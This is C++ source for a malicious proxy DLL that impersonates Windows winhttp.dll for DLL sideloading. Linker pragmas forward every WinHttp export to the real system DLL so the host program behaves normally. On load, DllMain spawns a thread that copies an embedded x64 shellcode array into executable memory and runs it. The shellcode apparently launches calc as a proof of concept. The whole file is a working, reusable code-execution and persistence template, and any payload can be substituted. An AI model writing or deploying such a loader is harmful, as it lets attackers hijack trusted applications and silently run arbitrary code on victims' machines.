#pragma once

#pragma comment(linker,"/export:DllCanUnloadNow=C:\\Windows\\System32\\winhttp.DllCanUnloadNow,@2")
#pragma comment(linker,"/export:DllGetClassObject=C:\\Windows\\System32\\winhttp.DllGetClassObject,@3")
#pragma comment(linker,"/export:Private1=C:\\Windows\\System32\\winhttp.Private1,@4")
#pragma comment(linker,"/export:SvchostPushServiceGlobals=C:\\Windows\\System32\\winhttp.SvchostPushServiceGlobals,@5")
#pragma comment(linker,"/export:WinHttpAddRequestHeaders=C:\\Windows\\System32\\winhttp.WinHttpAddRequestHeaders,@6")
#pragma comment(linker,"/export:WinHttpAddRequestHeadersEx=C:\\Windows\\System32\\winhttp.WinHttpAddRequestHeadersEx,@7")
#pragma comment(linker,"/export:WinHttpAutoProxySvcMain=C:\\Windows\\System32\\winhttp.WinHttpAutoProxySvcMain,@8")
#pragma comment(linker,"/export:WinHttpCheckPlatform=C:\\Windows\\System32\\winhttp.WinHttpCheckPlatform,@9")
#pragma comment(linker,"/export:WinHttpCloseHandle=C:\\Windows\\System32\\winhttp.WinHttpCloseHandle,@10")
#pragma comment(linker,"/export:WinHttpConnect=C:\\Windows\\System32\\winhttp.WinHttpConnect,@11")
#pragma comment(linker,"/export:WinHttpConnectionDeletePolicyEntries=C:\\Windows\\System32\\winhttp.WinHttpConnectionDeletePolicyEntries,@12")
#pragma comment(linker,"/export:WinHttpConnectionDeleteProxyInfo=C:\\Windows\\System32\\winhttp.WinHttpConnectionDeleteProxyInfo,@13")
#pragma comment(linker,"/export:WinHttpConnectionFreeNameList=C:\\Windows\\System32\\winhttp.WinHttpConnectionFreeNameList,@14")
#pragma comment(linker,"/export:WinHttpConnectionFreeProxyInfo=C:\\Windows\\System32\\winhttp.WinHttpConnectionFreeProxyInfo,@15")
#pragma comment(linker,"/export:WinHttpConnectionFreeProxyList=C:\\Windows\\System32\\winhttp.WinHttpConnectionFreeProxyList,@16")
#pragma comment(linker,"/export:WinHttpConnectionGetNameList=C:\\Windows\\System32\\winhttp.WinHttpConnectionGetNameList,@17")
#pragma comment(linker,"/export:WinHttpConnectionGetProxyInfo=C:\\Windows\\System32\\winhttp.WinHttpConnectionGetProxyInfo,@18")
#pragma comment(linker,"/export:WinHttpConnectionGetProxyList=C:\\Windows\\System32\\winhttp.WinHttpConnectionGetProxyList,@19")
#pragma comment(linker,"/export:WinHttpConnectionOnlyConvert=C:\\Windows\\System32\\winhttp.WinHttpConnectionOnlyConvert,@20")
#pragma comment(linker,"/export:WinHttpConnectionOnlyReceive=C:\\Windows\\System32\\winhttp.WinHttpConnectionOnlyReceive,@21")
#pragma comment(linker,"/export:WinHttpConnectionOnlySend=C:\\Windows\\System32\\winhttp.WinHttpConnectionOnlySend,@22")
#pragma comment(linker,"/export:WinHttpConnectionSetPolicyEntries=C:\\Windows\\System32\\winhttp.WinHttpConnectionSetPolicyEntries,@23")
#pragma comment(linker,"/export:WinHttpConnectionSetProxyInfo=C:\\Windows\\System32\\winhttp.WinHttpConnectionSetProxyInfo,@24")
#pragma comment(linker,"/export:WinHttpConnectionUpdateIfIndexTable=C:\\Windows\\System32\\winhttp.WinHttpConnectionUpdateIfIndexTable,@25")
#pragma comment(linker,"/export:WinHttpCrackUrl=C:\\Windows\\System32\\winhttp.WinHttpCrackUrl,@26")
#pragma comment(linker,"/export:WinHttpCreateProxyResolver=C:\\Windows\\System32\\winhttp.WinHttpCreateProxyResolver,@27")
#pragma comment(linker,"/export:WinHttpCreateUrl=C:\\Windows\\System32\\winhttp.WinHttpCreateUrl,@28")
#pragma comment(linker,"/export:WinHttpDetectAutoProxyConfigUrl=C:\\Windows\\System32\\winhttp.WinHttpDetectAutoProxyConfigUrl,@29")
#pragma comment(linker,"/export:WinHttpFreeProxyResult=C:\\Windows\\System32\\winhttp.WinHttpFreeProxyResult,@30")
#pragma comment(linker,"/export:WinHttpFreeProxyResultEx=C:\\Windows\\System32\\winhttp.WinHttpFreeProxyResultEx,@31")
#pragma comment(linker,"/export:WinHttpFreeProxySettings=C:\\Windows\\System32\\winhttp.WinHttpFreeProxySettings,@32")
#pragma comment(linker,"/export:WinHttpFreeProxySettingsEx=C:\\Windows\\System32\\winhttp.WinHttpFreeProxySettingsEx,@33")
#pragma comment(linker,"/export:WinHttpFreeQueryConnectionGroupResult=C:\\Windows\\System32\\winhttp.WinHttpFreeQueryConnectionGroupResult,@34")
#pragma comment(linker,"/export:WinHttpGetDefaultProxyConfiguration=C:\\Windows\\System32\\winhttp.WinHttpGetDefaultProxyConfiguration,@35")
#pragma comment(linker,"/export:WinHttpGetIEProxyConfigForCurrentUser=C:\\Windows\\System32\\winhttp.WinHttpGetIEProxyConfigForCurrentUser,@36")
#pragma comment(linker,"/export:WinHttpGetProxyForUrl=C:\\Windows\\System32\\winhttp.WinHttpGetProxyForUrl,@37")
#pragma comment(linker,"/export:WinHttpGetProxyForUrlEx=C:\\Windows\\System32\\winhttp.WinHttpGetProxyForUrlEx,@38")
#pragma comment(linker,"/export:WinHttpGetProxyForUrlEx2=C:\\Windows\\System32\\winhttp.WinHttpGetProxyForUrlEx2,@39")
#pragma comment(linker,"/export:WinHttpGetProxyForUrlHvsi=C:\\Windows\\System32\\winhttp.WinHttpGetProxyForUrlHvsi,@40")
#pragma comment(linker,"/export:WinHttpGetProxyResult=C:\\Windows\\System32\\winhttp.WinHttpGetProxyResult,@41")
#pragma comment(linker,"/export:WinHttpGetProxyResultEx=C:\\Windows\\System32\\winhttp.WinHttpGetProxyResultEx,@42")
#pragma comment(linker,"/export:WinHttpGetProxySettingsEx=C:\\Windows\\System32\\winhttp.WinHttpGetProxySettingsEx,@43")
#pragma comment(linker,"/export:WinHttpGetProxySettingsResultEx=C:\\Windows\\System32\\winhttp.WinHttpGetProxySettingsResultEx,@44")
#pragma comment(linker,"/export:WinHttpGetProxySettingsVersion=C:\\Windows\\System32\\winhttp.WinHttpGetProxySettingsVersion,@45")
#pragma comment(linker,"/export:WinHttpGetTunnelSocket=C:\\Windows\\System32\\winhttp.WinHttpGetTunnelSocket,@46")
#pragma comment(linker,"/export:WinHttpOpen=C:\\Windows\\System32\\winhttp.WinHttpOpen,@47")
#pragma comment(linker,"/export:WinHttpOpenRequest=C:\\Windows\\System32\\winhttp.WinHttpOpenRequest,@48")
#pragma comment(linker,"/export:WinHttpPacJsWorkerMain=C:\\Windows\\System32\\winhttp.WinHttpPacJsWorkerMain,@49")
#pragma comment(linker,"/export:WinHttpProbeConnectivity=C:\\Windows\\System32\\winhttp.WinHttpProbeConnectivity,@50")
#pragma comment(linker,"/export:WinHttpQueryAuthSchemes=C:\\Windows\\System32\\winhttp.WinHttpQueryAuthSchemes,@51")
#pragma comment(linker,"/export:WinHttpQueryConnectionGroup=C:\\Windows\\System32\\winhttp.WinHttpQueryConnectionGroup,@52")
#pragma comment(linker,"/export:WinHttpQueryDataAvailable=C:\\Windows\\System32\\winhttp.WinHttpQueryDataAvailable,@53")
#pragma comment(linker,"/export:WinHttpQueryHeaders=C:\\Windows\\System32\\winhttp.WinHttpQueryHeaders,@54")
#pragma comment(linker,"/export:WinHttpQueryHeadersEx=C:\\Windows\\System32\\winhttp.WinHttpQueryHeadersEx,@55")
#pragma comment(linker,"/export:WinHttpQueryOption=C:\\Windows\\System32\\winhttp.WinHttpQueryOption,@56")
#pragma comment(linker,"/export:WinHttpReadData=C:\\Windows\\System32\\winhttp.WinHttpReadData,@57")
#pragma comment(linker,"/export:WinHttpReadDataEx=C:\\Windows\\System32\\winhttp.WinHttpReadDataEx,@58")
#pragma comment(linker,"/export:WinHttpReadProxySettings=C:\\Windows\\System32\\winhttp.WinHttpReadProxySettings,@59")
#pragma comment(linker,"/export:WinHttpReadProxySettingsHvsi=C:\\Windows\\System32\\winhttp.WinHttpReadProxySettingsHvsi,@60")
#pragma comment(linker,"/export:WinHttpReceiveResponse=C:\\Windows\\System32\\winhttp.WinHttpReceiveResponse,@61")
#pragma comment(linker,"/export:WinHttpRegisterProxyChangeNotification=C:\\Windows\\System32\\winhttp.WinHttpRegisterProxyChangeNotification,@62")
#pragma comment(linker,"/export:WinHttpResetAutoProxy=C:\\Windows\\System32\\winhttp.WinHttpResetAutoProxy,@63")
#pragma comment(linker,"/export:WinHttpSaveProxyCredentials=C:\\Windows\\System32\\winhttp.WinHttpSaveProxyCredentials,@64")
#pragma comment(linker,"/export:WinHttpSendRequest=C:\\Windows\\System32\\winhttp.WinHttpSendRequest,@65")
#pragma comment(linker,"/export:WinHttpSetCredentials=C:\\Windows\\System32\\winhttp.WinHttpSetCredentials,@66")
#pragma comment(linker,"/export:WinHttpSetDefaultProxyConfiguration=C:\\Windows\\System32\\winhttp.WinHttpSetDefaultProxyConfiguration,@67")
#pragma comment(linker,"/export:WinHttpSetOption=C:\\Windows\\System32\\winhttp.WinHttpSetOption,@68")
#pragma comment(linker,"/export:WinHttpSetProxySettingsPerUser=C:\\Windows\\System32\\winhttp.WinHttpSetProxySettingsPerUser,@69")
#pragma comment(linker,"/export:WinHttpSetSecureLegacyServersAppCompat=C:\\Windows\\System32\\winhttp.WinHttpSetSecureLegacyServersAppCompat,@1")
#pragma comment(linker,"/export:WinHttpSetStatusCallback=C:\\Windows\\System32\\winhttp.WinHttpSetStatusCallback,@70")
#pragma comment(linker,"/export:WinHttpSetTimeouts=C:\\Windows\\System32\\winhttp.WinHttpSetTimeouts,@71")
#pragma comment(linker,"/export:WinHttpTimeFromSystemTime=C:\\Windows\\System32\\winhttp.WinHttpTimeFromSystemTime,@72")
#pragma comment(linker,"/export:WinHttpTimeToSystemTime=C:\\Windows\\System32\\winhttp.WinHttpTimeToSystemTime,@73")
#pragma comment(linker,"/export:WinHttpUnregisterProxyChangeNotification=C:\\Windows\\System32\\winhttp.WinHttpUnregisterProxyChangeNotification,@74")
#pragma comment(linker,"/export:WinHttpWebSocketClose=C:\\Windows\\System32\\winhttp.WinHttpWebSocketClose,@75")
#pragma comment(linker,"/export:WinHttpWebSocketCompleteUpgrade=C:\\Windows\\System32\\winhttp.WinHttpWebSocketCompleteUpgrade,@76")
#pragma comment(linker,"/export:WinHttpWebSocketQueryCloseStatus=C:\\Windows\\System32\\winhttp.WinHttpWebSocketQueryCloseStatus,@77")
#pragma comment(linker,"/export:WinHttpWebSocketReceive=C:\\Windows\\System32\\winhttp.WinHttpWebSocketReceive,@78")
#pragma comment(linker,"/export:WinHttpWebSocketSend=C:\\Windows\\System32\\winhttp.WinHttpWebSocketSend,@79")
#pragma comment(linker,"/export:WinHttpWebSocketShutdown=C:\\Windows\\System32\\winhttp.WinHttpWebSocketShutdown,@80")
#pragma comment(linker,"/export:WinHttpWriteData=C:\\Windows\\System32\\winhttp.WinHttpWriteData,@81")
#pragma comment(linker,"/export:WinHttpWriteProxySettings=C:\\Windows\\System32\\winhttp.WinHttpWriteProxySettings,@82")

#include "windows.h"
unsigned char shellcode[272] = {
    0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xc0,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,
    0x51,0x56,0x48,0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x48,
    0x8b,0x52,0x20,0x48,0x8b,0x72,0x50,0x48,0x0f,0xb7,0x4a,0x4a,0x4d,0x31,0xc9,
    0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0x41,0xc1,0xc9,0x0d,0x41,
    0x01,0xc1,0xe2,0xed,0x52,0x41,0x51,0x48,0x8b,0x52,0x20,0x8b,0x42,0x3c,0x48,
    0x01,0xd0,0x8b,0x80,0x88,0x00,0x00,0x00,0x48,0x85,0xc0,0x74,0x67,0x48,0x01,
    0xd0,0x50,0x8b,0x48,0x18,0x44,0x8b,0x40,0x20,0x49,0x01,0xd0,0xe3,0x56,0x48,
    0xff,0xc9,0x41,0x8b,0x34,0x88,0x48,0x01,0xd6,0x4d,0x31,0xc9,0x48,0x31,0xc0,
    0xac,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0x38,0xe0,0x75,0xf1,0x4c,0x03,0x4c,
    0x24,0x08,0x45,0x39,0xd1,0x75,0xd8,0x58,0x44,0x8b,0x40,0x24,0x49,0x01,0xd0,
    0x66,0x41,0x8b,0x0c,0x48,0x44,0x8b,0x40,0x1c,0x49,0x01,0xd0,0x41,0x8b,0x04,
    0x88,0x48,0x01,0xd0,0x41,0x58,0x41,0x58,0x5e,0x59,0x5a,0x41,0x58,0x41,0x59,
    0x41,0x5a,0x48,0x83,0xec,0x20,0x41,0x52,0xff,0xe0,0x58,0x41,0x59,0x5a,0x48,
    0x8b,0x12,0xe9,0x57,0xff,0xff,0xff,0x5d,0x48,0xba,0x01,0x00,0x00,0x00,0x00,
    0x00,0x00,0x00,0x48,0x8d,0x8d,0x01,0x01,0x00,0x00,0x41,0xba,0x31,0x8b,0x6f,
    0x87,0xff,0xd5,0xbb,0xe0,0x1d,0x2a,0x0a,0x41,0xba,0xa6,0x95,0xbd,0x9d,0xff,
    0xd5,0x48,0x83,0xc4,0x28,0x3c,0x06,0x7c,0x0a,0x80,0xfb,0xe0,0x75,0x05,0xbb,
    0x47,0x13,0x72,0x6f,0x6a,0x00,0x59,0x41,0x89,0xda,0xff,0xd5,0x63,0x61,0x6c,
    0x63,0x00
};

// Function to execute shellcode
DWORD WINAPI ExecuteShellcode(LPVOID lpParameter)
{
    // Allocate memory with executable permissions
    void* execMem = VirtualAlloc(NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (execMem == NULL)
    {
        OutputDebugStringA("VirtualAlloc failed");
        return 1;
    }

    // Copy shellcode into allocated memory
    memcpy(execMem, shellcode, sizeof(shellcode));

    // Execute shellcode
    ((void(*)())execMem)();

    // Free allocated memory
    VirtualFree(execMem, 0, MEM_RELEASE);

    return 0;
}

// Forwarded function for sideloading
extern "C" __declspec(dllexport) HRESULT WINAPI MyForwardedFunction()
{
    // Create a thread for shellcode execution to avoid blocking
    HANDLE hThread = CreateThread(NULL, 0, ExecuteShellcode, NULL, 0, NULL);
    if (hThread)
    {
        CloseHandle(hThread);
    }
    return S_OK; // Match expected return type
}

// DLL entry point
BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved)
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
        DisableThreadLibraryCalls(hModule);

        // Delay shellcode execution in a separate thread
        CreateThread(NULL, 0, ExecuteShellcode, NULL, 0, NULL);
        break;
    }
    return TRUE;
}
